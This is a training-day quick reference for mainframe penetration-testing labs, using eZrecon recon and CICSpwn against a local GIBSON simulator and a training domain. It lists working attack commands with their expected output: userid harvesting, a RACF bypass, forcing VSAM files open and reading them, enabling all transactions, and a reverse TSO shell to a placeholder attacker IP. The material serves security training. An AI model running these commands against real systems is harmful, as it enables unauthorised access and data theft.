# Training Day Quick Reference — EZrecon-2 (macOS)

One page to run the labs from. Everything here was set up and smoke-tested on this MacBook Pro (Apple Silicon, macOS 26, Homebrew Python 3.14).

**EZrecon-2** is this macOS-verified bundle and the web3270 SecTools integration work. It stands on:

- **eZrecon** by **Kev Milne** (OffensiveSec.org) and **Phil Young** (Soldier of Fortran) — the mainframe OSINT and recon tool, a rebuild of the EZRecon from the *Hacking Mainframes* companion material. All recon capability here is theirs.
- **CICSpwn** by **Ayoub Elaassal** ([@Ayoul3](https://github.com/ayoul3)) — this build adds only py3270 compatibility fixes; the CICS logic is unchanged.
- **Mainframe NSE scripts** (`tn3270-*`, `cics-*`, `tso-*`, `vtam-enum`, `drda-*`) — several trace to **Phil Young**'s research, now upstreamed into nmap.
- **GIBSON** simulator by **Kev Milne**.

---

## Where things live

| Thing | Path / command |
|---|---|
| Scripts | `./setup.sh` (once) · `./start.sh [--gibson] [--sectools]` · `./stop.sh` · `./status.sh` |
| SecTools shell | `~/git/Ezrecon/sectools/` — unified Recon + Session + CICS + Evidence UI (`./start.sh --sectools` → http://127.0.0.1:8899) |
| eZrecon command | `ezrecon` (pipx, `~/.local/bin/ezrecon`, version 2.23.4) |
| eZrecon source (for reference) | `~/git/Ezrecon/ezrecon-src/` |
| CICSpwn | `~/git/Ezrecon/cicspwn/` — run it with `./cicspwn` (wrapper) or `.venv/bin/python cicspwn.py` |
| CICSpwn lab guide | `~/git/Ezrecon/cicspwn/CICSpwn-Lab-Guide.pdf` |
| nmap + mainframe NSE | Homebrew, `nmap` on PATH, 17 mainframe scripts bundled |
| s3270 | Homebrew, `s3270` on PATH (drives CICSpwn's terminal) |
| SearXNG (keyless search) | Docker container `ezrecon-searxng` on `http://localhost:10080` |
| eZrecon config | `~/.config/ezrecon/config.json` |
| GIBSON simulator | `~/git/GIBSON/gibson-mainframe/` — start with `./run_gibson.sh` (or `gibsonctl.sh`) |

eZrecon training target: **`sighberbank.com`**
CICSpwn training target: **GIBSON**, host `127.0.0.1`, port `23`, APPLID `CICS`

---

## Start of day (pre-flight)

**Fast path:** `./setup.sh` the first time on a machine, then `./start.sh --gibson` each day, then `./status.sh` to confirm all green. The manual checks below are what those scripts automate.

```bash
# 1. eZrecon is alive
ezrecon --version                       # -> EZRecon 2.23.4

# 2. nmap + the mainframe scripts are visible to eZrecon
ezrecon nse list | grep -E 'cics|tso|drda|tn3270|vtam'

# 3. SearXNG is up (start Docker Desktop first if not)
ezrecon searx status                    # Container running: True / JSON API working: True
#   if not:  ezrecon searx setup --yes --port 10080

# 4. keys, if the labs need them (optional; skip for the keyless labs)
ezrecon config set shodan_api_key  <key>
ezrecon config set google_api_key  <key>
ezrecon config set google_cse_id   <id>
ezrecon config set hibp_api_key    <key>
ezrecon config show

# 5. for the CICSpwn labs: start GIBSON, then confirm it answers on 23
cd ~/git/GIBSON/gibson-mainframe && ./run_gibson.sh      # separate terminal
nc -z 127.0.0.1 23 && echo "GIBSON 3270 is listening"
```

---

## eZrecon labs — target `sighberbank.com`

All passive and keyless unless marked. Add `--report ./out` to any command to also write `md` + `html` + `json` + `queries.txt` + graph.

| Lab | Command | Look for |
|---|---|---|
| 0 — first sweep | `ezrecon auto sighberbank.com --report ./out` | Read the reds first. Then `ezrecon graph ./out/ezrecon_sighberbank_com.json --out ./out/g.html` and open it. |
| DNS | `ezrecon dns sighberbank.com` | MX (mail provider), TXT entries naming middleware or gateways in front of z/OS, any AXFR that succeeds. |
| WHOIS | `ezrecon whois sighberbank.com` | Registrar, creation date, name servers. A redacted registrant is normal. |
| Subdomains | `ezrecon subdomains sighberbank.com` | Gateway / mainframe-looking hostnames. `--no-brute` for passive-only, `--wordlist <file>` for depth. |
| crt.sh | `ezrecon crtsh sighberbank.com` | Internal-looking names a wordlist would never guess. Compare against the brute list. |
| Wayback | `ezrecon wayback sighberbank.com` | Archived JCL / COBOL / config / backup files, deleted-but-captured pages. |
| Doc metadata | `ezrecon docmeta sighberbank.com` | Author / last-modified-by usernames (candidate TSO / RACF userids), software versions. |
| People harvest | `ezrecon harvest sighberbank.com --deep` | Confirmed addresses + the inferred naming pattern = a userid list. |
| Takeover | `ezrecon takeover sighberbank.com` | A HIGH result is a hostname an attacker could serve content from as the org. DNS-only; `--http` to confirm is active and gated. |
| Dorks (keyless) | `ezrecon dork sighberbank.com --all --links` | Clickable search URLs. Add `--fetch` for real results via SearXNG. |
| GitHub dorks | `ezrecon github sighberbank.com --org <org>` | Query links for leaked copybooks / connection strings. `--fetch` needs a token. |
| AI OSINT prompt | `ezrecon prompt sighberbank.com` | A structured prompt to paste into an assistant for a second read. |
| Shodan (needs key) | `ezrecon shodan --mainframe sighberbank.com` | Mainframe fingerprints Shodan already holds, no packet sent by you. |
| CTI news | `ezrecon rss` | Anything tied to the target in the week's mainframe security news. |

### Active recon (only against hosts you are authorised to test)

```bash
# native connect + banner + mainframe fingerprint (no nmap, no root)
ezrecon ports <host>
ezrecon ports <host> --ports 23,992,446,447,448,3270,50000

# build an nmap/NSE command from a book preset (prints the command; run it yourself)
ezrecon nse build --preset mainframe-sweep <host>
ezrecon nse build --preset tn3270 <host>
ezrecon nse build --preset db2-drda <host> --script-arg drda-brute.dbname=CBSA
```

The TUI's **MyMap** screen (`n` key) is the place to actually *run* NSE scans, it has a Run button with a confirm. Lab: `n` -> `MAINFRAME` -> `tso-enum` -> read its args -> set target and `-p 23` on the `$ nmap` line -> Run -> Report.

### The TUI

Run `ezrecon` in a real terminal (Terminal.app / iTerm). Keys: `r` run, `a` auto, `e` report, `k` keys, `p` preview a dork, `g` graph, `o` options, `n` MyMap, `s` CTI RSS, `t` notepad, `F1` contextual help + per-module lab, `c` clear, `q` quit.

---

## CICSpwn labs — target GIBSON `127.0.0.1 23`, APPLID `CICS`

Run from `~/git/Ezrecon/cicspwn/`. The lab guide writes `./cicspwn.py`; on this Mac use `./cicspwn` (wrapper that picks the venv Python). Everything after that matches the guide's Appendix A.

```bash
cd ~/git/Ezrecon/cicspwn
```

| Lab | Command | Expected against GIBSON |
|---|---|---|
| 0 — first contact | `./cicspwn -a CICS 127.0.0.1 23 -i` | `[+] Connecting to target 127.0.0.1:23` / `[*] Access to CICS Terminal is possible with APPID CICS` |
| 1 — recon (`-i`) | `./cicspwn -a CICS 127.0.0.1 23 -i` | Reachable txns (CEMT/CEDA/CECI…), z/OS 2.05 / CICS TS 73, Sysid GIB1, HLQ `GIBSON.BANK.**`, users, spool, ESM present |
| 2 — TS queue enum (`-e`) | `./cicspwn -a CICS 127.0.0.1 23 -e` | `Tsqueue Items Length Transaction` table (GIBSON, BANKAUD, PWNLOG). If blocked, retry with `--bypass`. |
| 3 — read a VSAM file | `./cicspwn -a CICS 127.0.0.1 23 --get-file FILEA`<br>`./cicspwn -a CICS 127.0.0.1 23 --get-file FILEB` | FILEA reads straight away; FILEB starts closed, CICSpwn flips it `OPEN ENA READ` via CEMT then reads it. |
| 4 — RACF bypass | `./cicspwn -a CICS 127.0.0.1 23 -e --bypass` | `CEMT successfully copied to CSPS` / `CECI successfully copied to CSPK` and both installed. Lab 2 then works even where it was blocked. |
| 5 — enable transactions | `./cicspwn -a CICS 127.0.0.1 23 --enable-tran ALL` | `[+] Activating ALL transactions`. Swap `ALL` for a single txn id to enable just one. |
| 6 — authenticated ops | `./cicspwn -a CICS 127.0.0.1 23 -U IBMUSER -P SYS1 --enable-tran ALL` | Needs GIBSON in realistic-auth mode so it presents CESN on connect. Otherwise "could not find a password field" and it continues unauthenticated. |
| 7 — TSO shell via spool (advanced) | `./cicspwn -a CICS 127.0.0.1 23 -s reverse_tso -l <your-ip>:4445`<br>`./cicspwn -a CICS 127.0.0.1 23 -s direct_tso` | Needs a working internal-reader TD queue (`IRDR`) and a live JES spool token. Treat as the objective for a full target, not a guaranteed result on base GIBSON. |

---

## Troubleshooting

| Symptom | Meaning / fix |
|---|---|
| `ImportError: x3270App` or `expected str ... bytes found` (CICSpwn) | You ran the unpatched tool with system Python. Use `./cicspwn` or `.venv/bin/python cicspwn.py`. |
| CICSpwn: "Could not find a password field" | GIBSON didn't present a sign-on screen. Run without `-U/-P`, or start GIBSON in realistic-auth mode. |
| CICSpwn: "Keyboard locked / Operator error" | Panel not accepting input where expected. Confirm the target is the reworked GIBSON build. |
| CICSpwn: "Could not list tsqueues through Inquire" | Retry the command with `--bypass` (Lab 4). |
| `ezrecon` hangs on a bare run | The TUI needs a real terminal. Use Terminal.app / iTerm, not a pipe or non-interactive shell. |
| `ezrecon whois` returns only the IANA stub | Outbound port 43 blocked on this network. WHOIS is richer on an unfiltered link; DNS/crt.sh still work. |
| `ezrecon crtsh` / `wayback` return nothing | crt.sh and archive.org were flaky during setup. Retry; they rate-limit. Not an install problem. |
| `dork --fetch` / `preview`: "engines rate-limited / CAPTCHA" | A fresh SearXNG gets throttled by upstreams. `--links` always works; a Google CSE key makes `--fetch` reliable. |
| `ezrecon nse` / MyMap: "nmap not found" | Shouldn't happen now (`brew install nmap` done). The hint text says `apt` even on Mac; ignore. |
| MyMap "Refresh script.db" fails | Needs `sudo nmap --script-updatedb` in your own terminal. Not required, brew shipped a built db. |
| Reports say "EZRecon 2.0 / passive reconnaissance only" | Known stale strings in this build. Cosmetic, the tool is 2.23.4 and has the nmap runner. |

---

## End of day

```bash
./stop.sh            # stops SearXNG
./stop.sh --all      # also stops GIBSON if this host started it
```

Nothing else needs stopping. To remove EZrecon-2 entirely later: `pipx uninstall ezrecon`, `docker rm -f ezrecon-searxng`, `brew uninstall nmap s3270`, delete `~/git/Ezrecon/ezrecon-src` and `~/git/Ezrecon/cicspwn`.

---

## SecTools shell (EZrecon-2 → web3270 integration)

A standalone Node app at `~/git/Ezrecon/sectools/` that unifies the tools into one
screen: **Recon** (eZrecon output) → **Targets** rail → **Session** (live 3270 via
`tn3270_library`) → **CICS** (five native primitives) → **Evidence** (one engagement
record + report). Built to port into web3270 later; see `sectools/WIRING.md`.

```bash
./start.sh --sectools                 # http://127.0.0.1:8899
cd sectools && npm test               # 19 tests, no network (in-process CICS mock)
```

- Try it with **no mainframe**: add a target with address `mock`.
- CICS primitives (`infoGather`, `enumTSQ`, `readFile`, `racfBypass`, `enableTrans`) are
  clean-room reimplementations of the CICSpwn techniques, not embedded code.
- **Authorisation + audit.** Passive/read-only by default. Active recon (`ports`/`nse`) and
  the state-changing CICS primitives (`readFile`/`racfBypass`/`enableTrans`) are refused
  until you **Authorise** the target (approver + scope). Every action is written to
  `sectools/data/audit.log` with your operator id and the target domain. `SECTOOLS_LOCK_ACTIVE=true`
  hard-locks all active work.
- MCP surface: `sectools/mcp/server.js` (`recon_run`, `authorise_target`, `cics_run`, `get_audit_log`, …).

---

## Credits

- **eZrecon** — **Kev Milne** (OffensiveSec.org) and **Phil Young** (Soldier of Fortran). A rebuild of the EZRecon tool from the *Hacking Mainframes* companion material. The recon engine, the mainframe fingerprinting, the dork and Shodan catalogues, and the TUI are their work.
- **CICSpwn** — **Ayoub Elaassal** ([@Ayoul3](https://github.com/ayoul3)), GPL. This build carries only three py3270 compatibility fixes; the CICS logic is unchanged.
- **Mainframe NSE scripts** (`tn3270-*`, `cics-*`, `tso-*`, `vtam-enum`, `drda-*`, `nje-*`) — several originate with **Phil Young**'s research and are now upstreamed into nmap.
- **GIBSON** simulator — **Kev Milne**.
- **EZrecon-2** — this macOS-verified bundle, the setup/start scripts, the training card, and the web3270 SecTools integration work built on top of the above.
